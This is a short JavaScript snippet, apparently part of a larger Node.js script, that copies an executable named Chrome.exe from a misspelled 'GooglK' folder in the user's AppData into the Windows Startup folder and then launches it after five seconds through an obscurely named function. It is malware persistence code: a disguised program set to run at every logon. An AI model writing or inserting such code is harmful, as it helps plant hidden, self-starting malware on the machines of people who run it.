const sourceFile=`C:\\Users\\test\\AppData\\Roaming\\GooglK\\Chrome.exe`;
const startupFolder=`C:\\Users\\test\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`;
const destFile=path.resolve(startupFolder,"Chrome.exe");
if(!fs.existsSync(sourceFile)){return;}
fs.copyFileSync(sourceFile,destFile);
setTimeout(()=>{g7h8i9(`"${destFile}"`);},5000);
